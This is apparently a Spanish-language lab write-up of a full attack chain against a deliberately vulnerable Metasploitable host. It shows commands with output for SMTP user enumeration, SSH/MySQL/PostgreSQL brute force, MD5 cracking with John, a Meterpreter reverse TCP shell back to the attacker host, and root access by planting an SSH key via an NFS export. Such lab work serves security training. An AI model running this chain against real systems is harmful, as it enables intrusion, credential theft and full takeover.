= Ejecución (Metasploitable)

.Enumeración de usuarios con SMTP
[source]
----
# Enumeración mediante smtp-user-enum y un diccionario de usuarios de Metasploit Framework
┌──(root㉿kali)-[~]
└─# smtp-user-enum -U /usr/share/wordlists/metasploit/unix_users.txt -t 10.0.1.4
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /usr/share/wordlists/metasploit/unix_users.txt
Target count ............. 1
Username count ........... 168
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............

######## Scan started at Sun Apr  2 11:56:54 2023 #########
10.0.1.4: backup exists
10.0.1.4: bin exists
10.0.1.4: daemon exists
10.0.1.4: distccd exists
10.0.1.4: ftp exists
10.0.1.4: games exists
10.0.1.4: gnats exists
10.0.1.4: irc exists
10.0.1.4: libuuid exists
10.0.1.4: list exists
10.0.1.4: lp exists
10.0.1.4: man exists
10.0.1.4: mail exists
10.0.1.4: mysql exists
10.0.1.4: news exists
10.0.1.4: nobody exists
10.0.1.4: postfix exists
10.0.1.4: postgres exists
10.0.1.4: proxy exists
10.0.1.4: root exists
10.0.1.4: ROOT exists
10.0.1.4: service exists
10.0.1.4: postmaster exists
10.0.1.4: sshd exists
10.0.1.4: sync exists
10.0.1.4: sys exists
10.0.1.4: syslog exists
10.0.1.4: user exists
10.0.1.4: uucp exists
10.0.1.4: www-data exists
######## Scan completed at Sun Apr  2 11:56:55 2023 #########
30 results.
----

Tal y como se puede observar, en la siguiente salida, no se llega a probar el diccionario completo por _timeout_, no obstante, en este caso es suficiente para conseguir unas credenciales válidas.

.Fuerza bruta contra SSH
[source]
----
┌──(root㉿kali)-[~]
└─# nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst --script-args ssh-brute.timeout=4s 10.0.1.4
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-02 11:56 UTC
NSE: [ssh-brute] Trying username/password pair: root:root
NSE: [ssh-brute] Trying username/password pair: admin:admin
NSE: [ssh-brute] Trying username/password pair: administrator:administrator
NSE: [ssh-brute] Trying username/password pair: webadmin:webadmin
...
NSE: [ssh-brute] Trying username/password pair: web:eminem
NSE: [ssh-brute] usernames: Time limit 10m00s exceeded.
NSE: [ssh-brute] usernames: Time limit 10m00s exceeded.
NSE: [ssh-brute] passwords: Time limit 10m00s exceeded.
Nmap scan report for lab-vulnerable1-1.lab_vulnerable (10.0.1.4)
Host is up (0.000043s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-brute:
|   Accounts:
|     user:user - Valid credentials
|_  Statistics: Performed 693 guesses in 602 seconds, average tps: 1.2
MAC Address: 02:42:0A:00:01:04 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 602.72 seconds

┌──(root㉿kali)-[~]
└─# ssh -oHostKeyAlgorithms=+ssh-dss user@10.0.1.4
The authenticity of host '10.0.1.4 (10.0.1.4)' can't be established.
DSA key fingerprint is SHA256:kgTW5p1Amzh5MfHn9jIpZf2/pCIZq2TNrG9sh+fy95Q.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.1.4' (DSA) to the list of known hosts.
user@10.0.1.4's password:
Linux 32554753bfe5 4.13.0-21-generic #24-Ubuntu SMP Mon Dec 18 17:29:16 UTC 2017 x86_64

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
user@metasploitable:~$
----

Al haber conseguido acceder por SSH al contenedor vulnerable, procedemos a imprimir el archivo _passwd_, que nos permite obtener el listado completo de usuarios.

.Enumeración de usuarios por /etc/passwd
[source]
----
user@metasploitable:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
bind:x:105:113::/var/cache/bind:/bin/false
postfix:x:106:115::/var/spool/postfix:/bin/false
ftp:x:107:65534::/home/ftp:/bin/false
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
distccd:x:111:65534::/:/bin/false
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
service:x:1002:1002:,,,:/home/service:/bin/bash
telnetd:x:112:120::/nonexistent:/bin/false
proftpd:x:113:65534::/var/run/proftpd:/bin/false
statd:x:114:65534::/var/lib/nfs:/bin/false
snmp:x:115:65534::/var/lib/snmp:/bin/false
----

.Fuerza bruta contra MySQL
[source]
----
┌──(root㉿kali)-[~]
└─# nmap -p 3306 --script mysql-brute 10.0.1.4
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-02 12:47 UTC
Nmap scan report for lab-vulnerable1-1.lab_vulnerable (10.0.1.4)
Host is up (0.00011s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-brute:
|   Accounts:
|     root:<empty> - Valid credentials
|     guest:<empty> - Valid credentials
|_  Statistics: Performed 40013 guesses in 13 seconds, average tps: 3077.9
MAC Address: 02:42:0A:00:01:04 (Unknown)
----

Las cuentas _root_ y _guest_ de MySQL carecen de contraseña, lo que nos permite acceder a la totalidad de bases de datos de MySQL y encontrar datos tan delicados como los hashes de una tabla de usuarios.

[source]
----
mysql> select * from users_users;
+--------+-------+-------+----------+----------+---------------+-----------+--------------+------------------+-----------+----------+----------------------------------+---------+------------+------------+----------------+------------+---------------+------------+-------+-------+
| userId | email | login | password | provpass | default_group | lastLogin | currentLogin | registrationDate | challenge | pass_due | hash                             | created | avatarName | avatarSize | avatarFileType | avatarData | avatarLibName | avatarType | score | valid |
+--------+-------+-------+----------+----------+---------------+-----------+--------------+------------------+-----------+----------+----------------------------------+---------+------------+------------+----------------+------------+---------------+------------+-------+-------+
|      1 |       | admin | admin    | NULL     | NULL          |      NULL |         NULL |             NULL | NULL      |     NULL | f6fdffe48c908deb0f4c3bd36c032e72 |    NULL | NULL       |       NULL | NULL           | NULL       | NULL          | NULL       |     0 | NULL  |
+--------+-------+-------+----------+----------+---------------+-----------+--------------+------------------+-----------+----------+----------------------------------+---------+------------+------------+----------------+------------+---------------+------------+-------+-------+
----

.Rotura de hash MD5 con John the Ripper
[source]
----
┌──(root㉿kali)-[~]
└─# john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 ASIMD 4x2])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
adminadmin       (?)
1g 0:00:00:00 DONE (2023-04-09 01:20) 33.33g/s 12288Kp/s 12288Kc/s 12288KC/s bella47..ROCCO
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
----

.Fuerza bruta contra PostgreSQL
[source]
----
┌──(root㉿kali)-[~]
└─# nmap -p 5432 10.0.1.4 --script pgsql-brute --script-args userdb=/usr/share/wordlists/metasploit/postgres_default_user.txt,passdb=/usr/share/wordlists/metasploit/postgres_default_pass.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-02 17:20 UTC
Nmap scan report for lab-vulnerable1-1.lab_vulnerable (10.0.1.4)
Host is up (0.000089s latency).

PORT     STATE SERVICE
5432/tcp open  postgresql
| pgsql-brute:
|_  postgres:postgres => Valid credentials
MAC Address: 02:42:0A:00:01:04 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 3.69 seconds
----

A partir de las credenciales de PostgresSQL obtenidas, procedemos a cargar un Meterpreter.

.Carga de Meterpreter
[source]
----
┌──(root㉿kali)-[~]
└─# msfconsole

     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v6.3.4-dev                           ]
+ -- --=[ 2294 exploits - 1201 auxiliary - 409 post       ]
+ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: View missing module options with show
missing
Metasploit Documentation: https://docs.metasploit.com/

msf6 > search postgres
Matching Modules
================

   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   0   auxiliary/server/capture/postgresql                                          normal     No     Authentication Capture: PostgreSQL
   1   post/linux/gather/enum_users_history                                         normal     No   
...
msf6 > use 13
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/postgres/postgres_payload) > show options

Module options (exploit/linux/postgres/postgres_payload):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  template1        yes       The database to authenticate against
   PASSWORD  postgres         no        The password for the specified usernam
                                        e. Leave blank for a random password.
   RHOSTS                     yes       The target host(s), see https://docs.m
                                        etasploit.com/docs/using-metasploit/ba
                                        sics/using-metasploit.html
   RPORT     5432             yes       The target port
   USERNAME  postgres         yes       The username to authenticate as
   VERBOSE   false            no        Enable verbose output
...
msf6 exploit(linux/postgres/postgres_payload) > set RHOST 10.0.1.4
RHOST => 10.0.1.4
msf6 exploit(linux/postgres/postgres_payload) > set LHOST 10.0.1.2
LHOST => 10.0.1.2
msf6 exploit(linux/postgres/postgres_payload) > exploit

[*] Started reverse TCP handler on 10.0.1.2:4444
[*] 10.0.1.4:5432 - PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
[*] Uploaded as /tmp/phGxQxZu.so, should be cleaned up automatically
[*] Sending stage (1017704 bytes) to 10.0.1.4
[*] Meterpreter session 1 opened (10.0.1.2:4444 -> 10.0.1.4:33892) at 2023-04-02 17:22:20 +0000

meterpreter > ls
Listing: /var/lib/postgresql/8.3/main
=====================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100600/rw-------  4     fil   2010-03-17 14:08:46 +0000  PG_VERSION
040700/rwx------  4096  dir   2010-03-17 14:08:56 +0000  base
040700/rwx------  4096  dir   2023-04-02 17:22:20 +0000  global
040700/rwx------  4096  dir   2010-03-17 14:08:49 +0000  pg_clog
040700/rwx------  4096  dir   2010-03-17 14:08:46 +0000  pg_multixact
040700/rwx------  4096  dir   2010-03-17 14:08:49 +0000  pg_subtrans
040700/rwx------  4096  dir   2010-03-17 14:08:46 +0000  pg_tblspc
040700/rwx------  4096  dir   2010-03-17 14:08:46 +0000  pg_twophase
040700/rwx------  4096  dir   2010-03-17 14:08:49 +0000  pg_xlog
100600/rw-------  125   fil   2023-04-02 10:31:38 +0000  postmaster.opts
100600/rw-------  54    fil   2023-04-02 10:31:38 +0000  postmaster.pid
100644/rw-r--r--  540   fil   2010-03-17 14:08:45 +0000  root.crt
100644/rw-r--r--  1224  fil   2010-03-17 14:07:45 +0000  server.crt
100640/rw-r-----  891   fil   2010-03-17 14:07:45 +0000  server.key
----

Aprovechando que el directorio raíz está compartido por NFS, generamos un par de claves RSA y la inyectamos en _authorized_keys_ de _root_, lo que nos garantiza acceso privilegiado en el sistema.

.Escalada de privilegios a través de NFS
[source]
----
┌──(root㉿kali)-[~]
└─# showmount -e 10.0.1.4
Export list for 10.0.1.4:
/ *
                                                                                                                                            
┌──(root㉿kali)-[~]
└─# ssh-keygen                  
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:lfGymIFjFSXkVQTGbxYH/uZY03CaEq3GZMwUpXbzDZg root@kali
The key's randomart image is:
+---[RSA 3072]----+
|       .=+*+*+.  |
|       + +.O.=.  |
|      + o +.Eo* .|
|     . . = B+= X.|
|        S .o= B +|
|           . * . |
|            . .  |
|                 |
|                 |
+----[SHA256]-----+

┌──(root㉿kali)-[~]
└─# mkdir /tmp/sshkey

┌──(root㉿kali)-[~]
└─# mount -t nfs 10.0.1.4:/ /tmp/sshkey 
                                                                                                                                            
┌──(root㉿kali)-[~]
└─# cat ~/.ssh/id_rsa.pub >> /tmp/ssh_key/root/.ssh/authorized_keys 
                                                                                                                                            
┌──(root㉿kali)-[~]
└─# umount /tmp/sshkey 

┌──(root㉿kali)-[~]
└─# ssh root@10.0.1.4
The authenticity of host '10.0.1.4 (10.0.1.4)' can't be established.
RSA key fingerprint is SHA256:BQHm5EoHX9GCiOLuVscegPXLQOsuPs+E9d/rrJB84rk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.1.4' (RSA) to the list of known hosts.
Enter passphrase for key '/root/.ssh/id_rsa': 
Last login: Sat Apr  8 17:16:06 2023 from :0.0
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
You have mail.
root@metasploitable:~#
----
